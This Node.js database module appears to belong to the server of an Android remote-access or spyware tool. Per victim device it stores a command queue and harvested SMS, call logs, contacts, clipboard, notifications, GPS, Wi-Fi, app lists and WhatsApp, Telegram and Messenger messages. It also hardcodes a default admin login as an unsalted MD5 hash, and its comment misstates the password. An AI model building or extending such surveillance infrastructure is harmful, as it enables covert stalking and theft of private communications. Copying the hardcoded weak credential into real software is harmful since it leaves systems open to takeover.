const lowdb = require("lowdb");
const FileSync = require("lowdb/adapters/FileSync");
const path = require("path");

// Main database
const mainDbPath = path.join(__dirname, "../maindb.json");
const mainDbAdapter = new FileSync(mainDbPath);
const mainDb = lowdb(mainDbAdapter);

// Initialize main database
mainDb.defaults({
  admin: {
    username: "admin",
    password: "5f4dcc3b5aa765d61d8327deb882cf99", // admin
    loginToken: "",
    logs: [],
    ipLog: [],
  },
  clients: [],
}).write();

class ClientDb {
  constructor(clientID) {
    this.clientID = clientID;
    this.dbPath = path.resolve("./clientData/", clientID + ".json");
    this.adapter = new FileSync(this.dbPath);
    this.db = lowdb(this.adapter);
    
    // Initialize with defaults
    this.db.defaults({
      clientID: this.clientID,
      CommandQue: [],
      SMSData: [],
      CallData: [],
      contacts: [],
      wifiNow: [],
      wifiLog: [],
      clipboardLog: [],
      notificationLog: [],
      enabledPermissions: [],
      apps: [],
      GPSData: [],
      GPSSettings: {
        updateFrequency: 0,
      },
      downloads: [],
      currentFolder: [],
      // Chat monitoring data
      whatsappMessages: [],
      telegramMessages: [],
      messengerMessages: [],
      chatContacts: {
        whatsapp: [],
        telegram: [],
        messenger: []
      }
    }).write();
  }

  get(path) {
    return this.db.get(path);
  }

  set(path, value) {
    return this.db.set(path, value).write();
  }

  update(path, value) {
    return this.db.update(path, value).write();
  }

  push(path, value) {
    return this.db.get(path).push(value).write();
  }

  remove(path, filter) {
    return this.db.get(path).remove(filter).write();
  }

  assign(path, value) {
    return this.db.get(path).assign(value).write();
  }

  find(path, filter) {
    return this.db.get(path).find(filter);
  }

  filter(path, filter) {
    return this.db.get(path).filter(filter);
  }

  sortBy(path, key) {
    return this.db.get(path).sortBy(key);
  }

  reverse(path) {
    return this.db.get(path).reverse();
  }

  value() {
    return this.db.value();
  }

  write() {
    return this.db.write();
  }
}

module.exports = {
  maindb: mainDb,
  clientdb: ClientDb,
};

// ALTERNATIVE VERSION FOR LOWDB V6 (Uncomment if using LowDB v6)
/*
const { Low } = require('lowdb');
const { JSONFile } = require('lowdb/node');
const path = require("path");

// Main database
const mainDbPath = path.join(__dirname, "../maindb.json");
const mainDbAdapter = new JSONFile(mainDbPath);
const mainDb = new Low(mainDbAdapter);

// Initialize main database
(async () => {
  await mainDb.read();
  mainDb.data = mainDb.data || {
    admin: {
      username: "admin",
      password: "5f4dcc3b5aa765d61d8327deb882cf99", // admin
      loginToken: "",
      logs: [],
      ipLog: [],
    },
    clients: [],
  };
  await mainDb.write();
})();

class ClientDb {
  constructor(clientID) {
    this.clientID = clientID;
    this.dbPath = path.resolve("./clientData/", clientID + ".json");
    this.adapter = new JSONFile(this.dbPath);
    this.db = new Low(this.adapter);
    
    // Initialize with defaults
    (async () => {
      await this.db.read();
      this.db.data = this.db.data || {
        clientID: this.clientID,
        CommandQue: [],
        SMSData: [],
        CallData: [],
        contacts: [],
        wifiNow: [],
        wifiLog: [],
        clipboardLog: [],
        notificationLog: [],
        enabledPermissions: [],
        apps: [],
        GPSData: [],
        GPSSettings: {
          updateFrequency: 0,
        },
        downloads: [],
        currentFolder: [],
        whatsappMessages: [],
        telegramMessages: [],
        messengerMessages: [],
        chatContacts: {
          whatsapp: [],
          telegram: [],
          messenger: []
        }
      };
      await this.db.write();
    })();
  }

  async get(path) {
    await this.db.read();
    return this.db.data[path];
  }

  async set(path, value) {
    await this.db.read();
    this.db.data[path] = value;
    await this.db.write();
    return this.db.data[path];
  }

  async update(path, value) {
    await this.db.read();
    this.db.data[path] = { ...this.db.data[path], ...value };
    await this.db.write();
    return this.db.data[path];
  }

  async push(path, value) {
    await this.db.read();
    if (!this.db.data[path]) this.db.data[path] = [];
    this.db.data[path].push(value);
    await this.db.write();
    return this.db.data[path];
  }

  async remove(path, filter) {
    await this.db.read();
    if (this.db.data[path]) {
      this.db.data[path] = this.db.data[path].filter(item => 
        !Object.keys(filter).every(key => item[key] === filter[key])
      );
      await this.db.write();
    }
    return this.db.data[path];
  }

  async assign(path, value) {
    await this.db.read();
    this.db.data[path] = { ...this.db.data[path], ...value };
    await this.db.write();
    return this.db.data[path];
  }

  async find(path, filter) {
    await this.db.read();
    if (!this.db.data[path]) return undefined;
    return this.db.data[path].find(item => 
      Object.keys(filter).every(key => item[key] === filter[key])
    );
  }

  async filter(path, filter) {
    await this.db.read();
    if (!this.db.data[path]) return [];
    return this.db.data[path].filter(item => 
      Object.keys(filter).every(key => item[key] === filter[key])
    );
  }

  async sortBy(path, key) {
    await this.db.read();
    if (!this.db.data[path]) return [];
    return this.db.data[path].sort((a, b) => a[key] - b[key]);
  }

  async reverse(path) {
    await this.db.read();
    if (!this.db.data[path]) return [];
    return this.db.data[path].reverse();
  }

  async value() {
    await this.db.read();
    return this.db.data;
  }

  async write() {
    await this.db.write();
  }
}

module.exports = {
  maindb: mainDb,
  clientdb: ClientDb,
};
*/
